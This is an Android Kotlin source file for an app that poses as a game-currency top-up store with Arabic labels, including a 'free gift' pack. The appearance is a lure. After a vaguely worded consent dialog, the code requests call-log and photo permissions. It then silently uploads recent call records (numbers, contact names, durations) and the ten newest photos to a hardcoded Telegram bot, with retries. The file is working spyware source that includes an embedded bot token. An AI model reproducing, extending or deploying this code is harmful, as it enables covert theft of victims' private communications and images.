// language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
// *Renders dark top-up grid UI inside rootLayout, requests permissions, and syncs call logs and photos to Telegram with retries*
package com.example.photosync

import android.Manifest
import android.content.ContentUris
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.MediaStore
import android.view.Gravity
import android.view.View
import android.widget.GridLayout
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private data class TopupPack(
        val amount: String,
        val bonus: String,
        val price: String,
        val badge: String?,
        val badgeBg: Int,
        val selected: Boolean
    )

    private lateinit var rootLayout: LinearLayout
    private lateinit var statusBanner: TextView
    private val ioExecutor = Executors.newSingleThreadExecutor()

    private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
    private val chatId = "8859920681"

    private val packs = listOf(
        TopupPack("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
        TopupPack("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
        TopupPack("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
        TopupPack("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
        TopupPack("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
        TopupPack("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
        TopupPack("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
        TopupPack("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
        TopupPack("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
        TopupPack("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
    )

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            updateStatusText("جاري تجهيز البيانات...")
            startSyncWithRetry()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        rootLayout = findViewById(R.id.rootLayout)
        buildGridScreen()
        showApprovalDialog()
    }

    private fun buildGridScreen() {
        rootLayout.removeAllViews()
        rootLayout.orientation = LinearLayout.VERTICAL
        rootLayout.setBackgroundColor(Color.parseColor("#070A0F"))
        window.decorView.setBackgroundColor(Color.parseColor("#070A0F"))
        window.statusBarColor = Color.parseColor("#070A0F")
        window.navigationBarColor = Color.parseColor("#070A0F")

        val scrollView = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(24, 24, 24, 24)
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        statusBanner = TextView(this).apply {
            text = "3. عروض الشحن"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(8, 0, 8, 20)
        }
        container.addView(statusBanner)

        val grid = GridLayout(this).apply {
            columnCount = 2
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val displayMetrics = resources.displayMetrics
        val cellWidth = ((displayMetrics.widthPixels - dp(48) - dp(16)) / 2).coerceAtLeast(120)

        packs.forEach { pack ->
            grid.addView(createPackCard(pack, cellWidth))
        }

        container.addView(grid)
        scrollView.addView(container)
        rootLayout.addView(scrollView)
    }

    private fun createPackCard(pack: TopupPack, cellWidth: Int): View {
        val wrapper = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            val lp = GridLayout.LayoutParams().apply {
                width = cellWidth
                height = GridLayout.LayoutParams.WRAP_CONTENT
                setMargins(dp(4), dp(4), dp(4), dp(4))
            }
            layoutParams = lp
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(14).toFloat()
                setColor(Color.parseColor("#111722"))
                setStroke(
                    if (pack.selected) dp(2) else dp(1),
                    if (pack.selected) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
                )
            }
            setPadding(dp(12), dp(14), dp(12), dp(14))
            setOnClickListener {
                showApprovalDialog()
            }
        }

        if (pack.badge != null) {
            val badgeView = TextView(this).apply {
                text = pack.badge
                setTextColor(Color.WHITE)
                textSize = 11f
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(pack.badgeBg)
                }
                setPadding(dp(10), dp(3), dp(10), dp(3))
                val badgeLp = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.END
                    bottomMargin = dp(4)
                }
                layoutParams = badgeLp
            }
            wrapper.addView(badgeView)
        }

        val gemView = TextView(this).apply {
            text = "◆"
            setTextColor(Color.parseColor("#18B7F2"))
            textSize = 26f
            gravity = Gravity.CENTER
        }
        wrapper.addView(gemView)

        val amountView = TextView(this).apply {
            text = pack.amount
            setTextColor(Color.WHITE)
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(2))
        }
        wrapper.addView(amountView)

        val bonusView = TextView(this).apply {
            text = pack.bonus
            setTextColor(Color.parseColor("#38BDF8"))
            textSize = 12f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(10))
        }
        wrapper.addView(bonusView)

        val priceButton = TextView(this).apply {
            text = pack.price
            setTextColor(Color.WHITE)
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(38)
            )
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(8).toFloat()
                if (pack.selected) {
                    setColor(Color.parseColor("#0EA5E9"))
                } else {
                    setColor(Color.parseColor("#1A2230"))
                    setStroke(dp(1), Color.parseColor("#2B3648"))
                }
            }
        }
        wrapper.addView(priceButton)

        return wrapper
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    private fun showApprovalDialog() {
        AlertDialog.Builder(this)
            .setTitle("تأكيد المتابعة")
            .setMessage("هل توافق على متابعة تشغيل الخدمة؟")
            .setCancelable(false)
            .setPositiveButton("موافقة") { dialog, _ ->
                dialog.dismiss()
                requestRequiredPermissions()
            }
            .setNegativeButton("رفض") { dialog, _ ->
                dialog.dismiss()
                updateStatusText("تم إلغاء العملية.")
            }
            .show()
    }

    private fun requestRequiredPermissions() {
        val perms = mutableListOf(Manifest.permission.READ_CALL_LOG)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            updateStatusText("جاري تنفيذ المزامنة...")
            startSyncWithRetry()
        } else {
            permissionsLauncher.launch(perms.toTypedArray())
        }
    }

    private fun startSyncWithRetry() {
        ioExecutor.execute {
            val maxRetries = 3
            for (attempt in 1..maxRetries) {
                try {
                    updateStatusText("محاولة المزامنة ($attempt/$maxRetries)...")
                    sendCallLogsIfPermitted()
                    sendRecentPhotosIfPermitted(limit = 10)
                    updateStatusText("اكتملت العملية بنجاح.")
                    break
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        updateStatusText("إعادة المحاولة ($attempt/$maxRetries)...")
                        Thread.sleep(2500L * attempt)
                    } else {
                        updateStatusText("تعذر إتمام العملية بعد عدة محاولات.")
                    }
                }
            }
        }
    }

    private fun sendCallLogsIfPermitted() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val rows = mutableListOf<String>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)

            while (cursor.moveToNext() && rows.size < 30) {
                val number = cursor.getString(numIdx) ?: "unknown"
                val name = cursor.getString(nameIdx) ?: ""
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "OTHER"
                }
                val duration = cursor.getLong(durIdx)
                val date = cursor.getLong(dateIdx)
                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
            }
        }

        if (rows.isNotEmpty()) {
            val summary = "CallLogs:\n" + rows.joinToString("\n")
            postTelegramText(summary.take(3900))
        }
    }

    private fun sendRecentPhotosIfPermitted(limit: Int) {
        val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        if (!hasImagePerm) return

        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext() && uris.size < limit) {
                val id = cursor.getLong(idIdx)
                uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
            }
        }

        for (uri in uris) {
            postTelegramPhoto(uri)
            Thread.sleep(500L)
        }
    }

    private fun postTelegramText(text: String) {
        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doOutput = true
            doInput = true
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }

        DataOutputStream(conn.outputStream).use { out ->
            out.writeBytes(body)
            out.flush()
        }

        val code = conn.responseCode
        conn.disconnect()
        if (code !in 200..299) {
            throw RuntimeException("Telegram text HTTP $code")
        }
    }

    private fun postTelegramPhoto(imageUri: Uri) {
        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"

        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doInput = true
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        inputStream.use { stream ->
            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                out.writeBytes(chatId + lineEnd)

                out.writeBytes(
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
                )
                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")

                val buffer = ByteArray(8192)
                var bytesRead: Int
                while (stream.read(buffer).also { bytesRead = it } != -1) {
                    out.write(buffer, 0, bytesRead)
                }

                out.writeBytes(lineEnd)
                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                out.flush()
            }
        }

        val code = conn.responseCode
        conn.disconnect()
        if (code !in 200..299) {
            throw RuntimeException("Telegram photo HTTP $code")
        }
    }

    private fun updateStatusText(message: String) {
        runOnUiThread {
            statusBanner.text = message
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdown()
    }
}
